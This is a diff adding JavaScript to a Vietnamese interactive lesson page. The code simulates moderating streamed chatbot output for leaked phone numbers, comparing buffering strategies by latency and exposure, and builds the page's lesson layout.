+        el('div', { class: 'cols' }, [el('div', {}, [el('h4', { html: 'Markdown đã nhận <small>(ô sáng: delta mới nhất)</small>' }), src]), el('div', {}, [el('h4', { html: 'Khách thấy <small>(viền cam: lộ ký hiệu, viền đỏ: vừa nhảy)</small>' }), view])]),
+        cap, el('div', { style: 'height:10px' }), cmp,
+        el('p', { class: 'hint', text: 'Renderer markdown trong trang là bản nhỏ tự viết (đoạn, bảng, code fence, **, backtick, link), đủ để thấy hiện tượng; không phải react-markdown hay Streamdown. Kích thước delta 2–7 ký tự, sinh ngẫu nhiên có seed.' }));
+      render();
+
+      const M = { kind: 'buffer', w: 9, c: 150 };
+      const svgBox = el('div'), mstat = el('div', { class: 'stat' }), mtext = el('div', { style: 'border:1px solid var(--line);border-radius:8px;padding:10px 12px;background:var(--bg);font-size:14px;margin-top:8px' }), mcap = el('div', { style: CAPS });
+      const wS = slider('Cửa sổ', 1, 40, 1, M.w, (v) => { M.w = v; renderM(); }, (v) => v + ' token');
+      function renderM() {
+        wS.input.disabled = !(M.kind === 'buffer' || M.kind === 'async');
+        const R = moderate(M), W = 640, L = 82, x = (t) => L + (t / R.end) * (W - L - 6), tw = Math.max(1.5, x(ITL) - x(0) - 0.6);
+        const g = [el('text', { x: 0, y: 22, class: 'mute', text: 'Model sinh' }), el('text', { x: 0, y: 62, class: 'mute', text: 'Khách thấy' })];
+        R.tok.forEach((t) => {
+          g.push(el('rect', { x: x(t.gen), y: 10, width: tw, height: 16, rx: 1, fill: t.bad ? 'var(--bad)' : 'var(--g1)', opacity: 0.8 }));
+          if (!t.hide) {
+            const end = t.retract !== null ? t.retract : R.end;
+            g.push(el('rect', { x: x(t.show), y: 50, width: tw, height: 16, rx: 1, fill: t.bad ? 'var(--bad)' : 'var(--accent)' }));
+            if (t.retract !== null) g.push(el('rect', { x: x(t.show), y: 70, width: Math.max(1, x(end) - x(t.show)), height: 4, fill: 'var(--warn)' }));
+          }
+        });
+        R.wins.forEach(([a, b], i) => { const xx = x(TTFT + b * ITL + ITL / 2); g.push(el('line', { x1: xx, x2: xx, y1: 4, y2: 32, stroke: R.flagged[i] ? 'var(--bad)' : 'var(--mute)', 'stroke-dasharray': '3 2' })); });
+        g.push(el('line', { x1: x(TTFT), x2: x(TTFT), y1: 44, y2: 84, stroke: 'var(--mute)' }), el('text', { x: x(TTFT) + 3, y: 96, class: 'mute', text: 'TTFT gốc 0,8 s' }));
+        if (R.firstShow > TTFT + 0.001) g.push(el('line', { x1: x(R.firstShow), x2: x(R.firstShow), y1: 44, y2: 84, stroke: 'var(--warn)', 'stroke-width': 2 }), el('text', { x: Math.min(W - 120, x(R.firstShow) + 3), y: 110, fill: 'var(--warn)', text: `khách thấy chữ đầu: ${fx(R.firstShow, 2)} s` }));
+        svgBox.replaceChildren(el('svg', { class: 'canvas', viewBox: `0 0 ${W} 118`, role: 'img', 'aria-label': 'Thời điểm sinh và hiển thị từng token' }, g));
+        const exp = R.exposure === Infinity ? 'mãi mãi' : R.exposure ? Math.round(R.exposure * 1000) + ' ms' : '0';
+        mstat.innerHTML = `<span>TTFT khách: <b>${fx(R.firstShow, 2)} s</b> (+${Math.round(R.added * 1000)} ms)</span><span>Token PII lộ ra: <b class="${R.badShown ? 'bad' : 'ok'}">${R.badShown}/3</b></span><span>Thời gian lộ: <b class="${R.exposure ? 'bad' : 'ok'}">${exp}</b></span><span>Token vô hại bị ẩn theo: <b>${R.goodHidden}</b></span>`;
+        let html = '', i = 0;
+        while (i < R.tok.length) {
+          const t = R.tok[i];
+          if (t.hide) { let j = i; while (j < R.tok.length && R.tok[j].hide) j++; html += '<span class="mute">[đã ẩn: thông tin cá nhân]</span> '; i = j; continue; }
+          html += t.retract !== null ? `<s class="mute">${esc(t.w)}</s> ` : t.bad ? `<b class="bad">${esc(t.w)}</b> ` : esc(t.w) + ' ';
+          i++;
+        }
+        mtext.innerHTML = '<div class="hint" style="margin:0 0 4px">Màn hình khách cuối cùng</div>' + html;
+        let col, h;
+        const missed = M.kind !== 'none' && R.badShown && !R.retracted;
+        if (M.kind === 'none') { col = 'var(--bad)'; h = '<b style="color:var(--bad)">Không kiểm duyệt: số điện thoại của khách khác hiện ra và ở lại.</b> TTFT đẹp nhất, rủi ro cao nhất.'; }
+        else if (missed) { col = 'var(--bad)'; h = `<b style="color:var(--bad)">Lọt dù đã ${M.kind === 'async' ? 'kiểm duyệt song song' : 'buffer'}.</b> Vì sao: số bị cắt ngang ranh giới cửa sổ. Classifier nhìn từng cửa sổ riêng: ${R.parts.map((p) => '"…' + esc(p.split(' ').filter((w) => /^\d{3,4}$/.test(w)).join(' ')) + '…"').join(' và ')}, không cửa sổ nào chứa đủ mẫu 0xxx xxx xxx. Không có nghĩa classifier kém: nó không bao giờ thấy cả số. Trong hệ thống thật: cắt cửa sổ theo câu, hoặc cho cửa sổ chồng lấn với cửa sổ trước.`; }
+        else if (M.kind === 'async') { col = 'var(--warn)'; h = `<b style="color:var(--warn)">Bắt được, nhưng khách đã thấy số trong ${exp}.</b> Vì sao: token hiện ngay khi sinh, kết luận của classifier đến sau khi cửa sổ đầy cộng ${M.c} ms. Không có nghĩa rút lại là vô ích: nó giới hạn thời gian lộ. Trong hệ thống thật: hợp chatbot nội bộ; với khách hàng bên ngoài, một lần nhìn là đủ lộ.`; }
+        else if (M.kind === 'nostream') { col = 'var(--ok)'; h = `<b style="color:var(--ok)">Chặn chắc chắn, nhưng khách chờ ${fx(R.firstShow, 2)} s mới thấy chữ đầu.</b> Đây là toàn bộ thời gian sinh cộng classifier. Câu trả lời 600 token ở Lab 6 sẽ là hơn 12 giây spinner.`; }
+        else { col = 'var(--ok)'; h = `<b style="color:var(--ok)">Chặn trước khi hiện.</b> Giá: chữ đầu tiên trễ thêm ${Math.round(R.added * 1000)} ms (thời gian sinh cửa sổ đầu cộng classifier), và ${R.goodHidden} token vô hại cùng cửa sổ bị ẩn theo.${M.kind === 'buffer' && M.w >= 20 ? ' Cửa sổ càng to, phần bị ẩn oan càng nhiều.' : ''}`; }
+        mcap.style.borderLeft = '3px solid ' + col; mcap.innerHTML = h;
+      }
+      stage.append(el('h4', { text: 'Kiểm duyệt output đang stream: cửa sổ bao nhiêu?', style: 'margin:26px 0 4px' }),
+        el('p', { class: 'hint', style: 'margin:0 0 8px', text: 'Trợ lý trả lời về đơn hàng và lỡ đọc ra số điện thoại của người nhận trước đó. Classifier PII (giả định) tìm mẫu 0xxx xxx xxx trong văn bản nó được xem.' }),
+        el('div', { class: 'row' }, [select('Cách kiểm duyệt', [['none', 'Không kiểm duyệt'], ['async', 'Stream ngay, kiểm song song, rút lại'], ['buffer', 'Buffer cửa sổ cố định'], ['sentence', 'Buffer theo câu'], ['nostream', 'Không stream, duyệt hết']], M.kind, (v) => { M.kind = v; renderM(); }).node, wS.node,
+          slider('Classifier mất', 20, 800, 10, M.c, (v) => { M.c = v; renderM(); }, (v) => v + ' ms').node]),
+        svgBox, el('div', { class: 'legend' }, [el('span', {}, [el('i', { style: 'background:var(--g1)' }), 'token sinh ra']), el('span', {}, [el('i', { style: 'background:var(--accent)' }), 'token khách thấy']), el('span', {}, [el('i', { style: 'background:var(--bad)' }), 'số điện thoại (PII)']), el('span', {}, [el('i', { style: 'background:var(--warn)' }), 'đang hiện, sắp bị rút lại'])]),
+        mstat, mtext, mcap);
+      renderM();
+    }
+  };
+})());
+function terms(list) {
+  return el('details', { class: 'terms', open: '' }, [el('summary', { text: 'Thuật ngữ cần biết (' + list.length + ')' }),
+    el('dl', {}, list.flatMap(([t, d]) => [el('dt', { text: t }), el('dd', { text: d })]))]);
+}
+
+function problem(p) {
+  const row = (t, html, cls) => el('div', { class: 'pr ' + (cls || '') }, [el('b', { text: t }), el('div', { html })]);
+  return el('div', { class: 'prob' }, [
+    ...(p.example ? [row('Ví dụ thực tế', p.example, 'ex')] : []), row('Bài toán', p.scenario), row('Câu hỏi', p.ask, 'ask'), row('Giải pháp trong lab này', p.solves, 'sol'),
+    row('Cách đọc hình', '<ol>' + p.read.map((r) => '<li>' + r + '</li>').join('') + '</ol>')
+  ]);
+}
+
+function randn(rnd) {
+  let u = 0, v = 0;
+  while (!u) u = rnd();
+  while (!v) v = rnd();
+  return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v);
+}
+function unitVec(d, rnd) {
+  const v = Array.from({ length: d }, () => randn(rnd));
+  const n = Math.hypot(...v);
+  return v.map((x) => x / n);
+}
+const dotp = (a, b) => a.reduce((s, x, i) => s + x * b[i], 0);
+
+function hbars(rows, opt = {}) {
+  const max = opt.max ?? Math.max(...rows.map((r) => r[1]));
+  const fmt = opt.fmt || ((v) => v);
+  return el('div', {}, rows.map(([label, v, cur]) => el('div', { class: 'mem' + (cur ? ' cur' : '') }, [
+    el('span', { text: label }), el('div', { class: 'track' }, [el('div', { class: 'fill', style: `width:${Math.max(0, (v / max) * 100)}%` })]), el('span', { class: 'v', text: fmt(v) })])));
+}
+
+function deepDive(list) {
+  if (!list || !list.length) return null;
+  return el('div', { class: 'deep' }, [
+    el('h3', { text: '10 vạn câu hỏi vì sao' }),
+    el('p', { class: 'hint', style: 'margin:0 0 8px', text: 'Mỗi câu trả lời dẫn tới câu hỏi tiếp theo. Đọc theo thứ tự, bấm vào câu hỏi để mở.' }),
+    ...list.map((d, i) => {
+      const box = el('details', Object.assign({ class: 'qa' }, i === 0 ? { open: '' } : {}), [
+        el('summary', {}, [el('span', { class: 'qn', text: String(i + 1) }), el('span', { text: d.q })]),
+        el('div', { class: 'qa-a', html: d.a })]);
+      if (d.viz) {
+        const v = el('div', { class: 'qa-viz' });
+        box.append(v);
+        try { d.viz(v); } catch (e) { v.append(el('p', { class: 'bad', text: 'Lỗi minh hoạ: ' + e.message })); }
+      }
+      if (d.take) box.append(el('div', { class: 'qa-take', html: '<b>Rút ra:</b> ' + d.take }));
+      return box;
+    })]);
+}
+
+function pocBlock(p) {
+  if (!p) return null;
+  return el('div', { class: 'poc' }, [
+    el('h3', { text: 'POC: tự chạy để thấy tận mắt' }),
+    el('p', { html: p.goal }),
+    el('div', { class: 'poc-run' }, [el('span', { text: 'File' }), el('code', { text: p.file }), el('span', { text: 'Chạy' }), el('code', { text: p.run })]),
+    p.needs ? el('p', { class: 'hint', html: 'Cần: ' + p.needs }) : null,
+    p.output ? el('details', { class: 'poc-out' }, [el('summary', { text: p.measured ? 'Output thật khi chạy script' : 'Output mẫu (script chưa chạy được)' }), el('pre', { text: p.output })]) : null,
+    p.read ? el('div', {}, [el('b', { text: 'Nhìn vào đâu' }), el('ol', {}, p.read.map((r) => el('li', { html: r })))]) : null
+  ]);
+}
+
+(function build() {
+  const nav = document.getElementById('tabs'), host = document.getElementById('lessons');
+  lessons.forEach((l) => {
+    nav.append(el('a', { href: '#' + l.id, text: l.nav }));
+    const stage = el('div', { class: 'stage' });
+    host.append(el('section', { class: 'lesson', id: l.id }, [
+      el('div', { class: 'eyebrow', text: (l.id === 'workflow' ? 'Workflow tổng hợp' : `Bài ${parseInt(l.nav, 10)}`) + ` · README ${l.ref}` }),
+      el('h2', { text: l.title }), terms(l.terms), problem(l.problem), el('p', { class: 'hook', text: l.hook }), stage, deepDive(l.deep),
+      el('div', { class: 'sum', html: l.summary || '' }),
+      el('div', { class: 'why' }, [
+        el('div', { class: 'c' }, [el('b', { text: 'Chọn gì, vì sao' }), el('span', { html: l.why.c })]),
+        el('div', { class: 's' }, [el('b', { text: 'Phương án bị loại' }), el('span', { html: l.why.s })]),
+        el('div', { class: 'p' }, [el('b', { text: 'Giá phải trả' }), el('span', { html: l.why.p })])
+      ]),
+      pocBlock(l.poc)
+    ]));
+    try { l.mount(stage); } catch (e) { stage.append(el('p', { class: 'bad', text: 'Lỗi tải minh hoạ: ' + e.message })); }
+  });
+})();
+</script></body></html>
